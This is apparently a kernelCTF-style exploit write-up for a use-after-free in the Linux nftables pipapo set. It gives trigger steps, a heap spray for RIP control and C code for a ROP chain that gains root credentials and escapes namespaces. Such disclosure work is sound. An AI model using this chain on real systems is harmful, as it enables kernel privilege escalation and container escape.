### Triggering Vulnerability

If elements with the same key exist in a pipapo set, `nft_pipapo_remove` may remove the wrong element. As a result, the deactivated element remains in the set, causing a UAF.

We can trigger the vulnerability as follows:

- Create a chain `Base`.
- Create a pipapo set `Vulnerable`.
- Create a set element with key k in `Vulnerable`. We set the timeout of element to 1.
- Create a set element with key k in `Vulnerable` again. We can create an element with the same key because the previously created element is timeout. Repeat this step 256 times.
- A timeouted element is left in the set due to an invalid remove function when it is gc'd.
- Delete set elem with key k. This results in a double free on the set element.

### KASLR Bypass

The kernel base address is obtained through a timing side-channel attack.

### RIP Control

RIP can be controlled as follows:

- Create a chain `Base`.
- Create two additional chains: `chain1` and `chain2`.
- Add a `nft_rule` to `chain1` with an immediate expr that refers to `chain2`.
- Create 0x200 dummy rules in `chain2` to allocate `nft_chain->blob_gen_0` in `dyn-kmalloc-rnd-xx-cg-8k`.
- Create a pipapo set `Vulnerable` and `Verdict`.
- Create a set element with key k in `Vulnerable`. We set the timeout of element to 1. The set element is allocated into `dyn-kmalloc-rnd-xx-cg-64`.
- Create a set element with key k in `Vulnerable` again. This is allowed because the previous element has timed out. Repeat this step 256 times.
- A timeouted element is left in the set due to an invalid remove function when it is gc'd.
- Spray set elements into set `Verdict`, allocating them in `dyn-kmalloc-rnd-xx-cg-64` so that they overlap the freed set element.
- Delete set `Vulnerable`, which frees the sprayed set elements due to the vulnerability.
- Spray new set elements with verdict data referring to `chain2` into `kmalloc-cg-64`, overlapping the freed object.
- Delete set `Verdict`, which deactivates `chain2` twice.
- Delete `chain2`, leaving a dangling pointer to it in the `nft_rule` under `chain1`. At the same time, `nft_chain->blob_gen_0` is freed.
- Spray a `struct xt_table_info` into `dyn-kmalloc-rnd-xx-cg-8k` to create fake blob object. The object is described in liona24's [write-up](https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2024-27397_mitigation/docs/exploit.md).
- Trigger `nft_do_chain` by sending a packet. Finally, RIP is controlled while executing `expr_call_ops_eval` [1].

```c
static void expr_call_ops_eval(const struct nft_expr *expr,
                    struct nft_regs *regs,
                    struct nft_pktinfo *pkt)
{
#ifdef CONFIG_RETPOLINE
    unsigned long e = (unsigned long)expr->ops->eval;
#define X(e, fun) \
    do { if ((e) == (unsigned long)(fun)) \
        return fun(expr, regs, pkt); } while (0)  // [1]

    X(e, nft_payload_eval);
    X(e, nft_cmp_eval);
    X(e, nft_counter_eval);
    X(e, nft_meta_get_eval);
    X(e, nft_lookup_eval);
    X(e, nft_range_eval);
    X(e, nft_immediate_eval);
    X(e, nft_byteorder_eval);
    X(e, nft_dynset_eval);
    X(e, nft_rt_get_eval);
    X(e, nft_bitwise_eval);
#undef  X
#endif /* CONFIG_RETPOLINE */
    expr->ops->eval(expr, regs, pkt);
}
```

### Post RIP

Store the ROP payload below to the `dyn-kmalloc-rnd-xx-cg-8k` and execute it.

```c
void make_payload(uint64_t* data){
    int i = 0;

    // current = find_task_by_vpid(getpid())
    data[i++] = kbase + pop_rdi_ret;
    data[i++] = getpid();
    data[i++] = kbase + find_task_by_vpid_off;

    // current += offsetof(struct task_struct, rcu_read_lock_nesting)
    data[i++] = kbase + pop_rsi_ret;
    data[i++] = 0x474;
    data[i++] = kbase + add_rax_rsi_ret;

    data[i++] = kbase + pop_rsi_ret;
    data[i++] = 0;

    // current->rcu_read_lock_nesting = 0 (Bypass rcu protected section)
    data[i++] = kbase + pop_rcx_ret;
    data[i++] = 0;
    data[i++] = kbase + mov_rax_rcx_ret;

    // commit_creds(&init_cred)
    data[i++] = kbase + pop_rdi_ret;
    data[i++] = kbase + init_cred_off;
    data[i++] = kbase + commit_creds_off;

    // find_task_by_vpid(1)
    data[i++] = kbase + pop_rdi_ret;
    data[i++] = 1;
    data[i++] = kbase + find_task_by_vpid_off;

    // switch_task_namespaces(find_task_by_vpid(1), &init_nsproxy)
    data[i++] = kbase + mov_rdi_rax_ret;
    data[i++] = kbase + pop_rsi_ret;
    data[i++] = kbase + init_nsproxy_off;
    data[i++] = kbase + switch_task_namespaces_off;

    data[i++] = kbase + swapgs_restore_regs_and_return_to_usermode_off;
    data[i++] = 0;
    data[i++] = 0;
    data[i++] = _user_rip;
    data[i++] = _user_cs;
    data[i++] = _user_rflags;
    data[i++] = _user_sp;
    data[i++] = _user_ss;
}
```